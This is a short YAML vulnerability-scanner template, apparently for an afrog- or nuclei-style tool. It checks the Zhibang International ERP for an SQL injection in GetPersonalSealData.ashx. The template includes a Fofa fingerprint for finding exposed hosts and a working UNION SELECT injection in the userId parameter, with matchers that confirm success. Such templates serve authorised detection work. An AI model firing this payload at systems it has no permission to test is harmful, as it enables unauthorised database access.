id: zbintel-erp-getpersonalsealdata-sqli

info:
  name: 智邦国际ERP GetPersonalSealData.ashx 接口存在SQL注入
  author: zan8in
  severity: high
  verified: true
  description: |-
    Fofa: icon_hash="-682445886"
  reference:
    - https://mp.weixin.qq.com/s/4nD3E26P-sEpAw51c9frUw
  tags: zbintel,sqli,erp
  created: 2024/01/08

rules:
  r0:
    request:
      method: GET
      path: /SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version--
    expression: |
      response.status == 200 && 
      response.body.ibcontains(b'"SealData":') && 
      response.body.ibcontains(b'"Image":') && 
      response.body.ibcontains(b'sql server')
expression: r0()